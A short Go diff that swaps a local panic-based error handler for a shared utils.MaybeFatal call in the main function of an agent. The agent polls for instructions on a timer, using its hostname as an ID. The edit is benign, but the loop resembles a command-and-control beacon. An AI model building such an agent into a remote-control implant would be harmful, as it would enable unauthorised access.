@@ -2,27 +2,18 @@ package main
 
 import (
 	"common/profiles"
+	"common/utils"
 	"fmt"
 	"os"
 	"time"
 )
 
-// handleErr handles errors of the main function only.
-// It handles unrecoverable errors and for most cases you don't
-// need to use this function.
-func handleErr(err error) {
-	if err == nil {
-		return
-	}
-	panic(err)
-}
-
 func main() {
 	profile, err := profiles.Load(rawProfile)
-	handleErr(err)
+	utils.MaybeFatal(err)
 
 	agentId, err := os.Hostname()
-	handleErr(err)
+	utils.MaybeFatal(err)
 
 	for range time.Tick(profile.GetTickAmount()) {
 		instruction, err := receive(&agentId, &profile)
